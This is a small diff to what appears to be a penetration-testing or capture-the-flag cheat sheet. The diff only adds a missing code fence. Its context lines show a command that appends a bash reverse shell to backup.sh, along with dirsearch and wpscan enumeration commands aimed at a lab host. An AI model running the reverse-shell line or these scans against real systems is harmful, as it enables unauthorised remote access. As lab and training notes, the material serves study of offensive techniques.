@@ -244,6 +244,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'" >> backup.sh
 ⌨️ Dirsearch
 ```
 $ dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u 'ipaddr'
+```
 ⌨️ wpscan
 ```
 $ wpscan -e u,ap,t --url internal.thm/blog
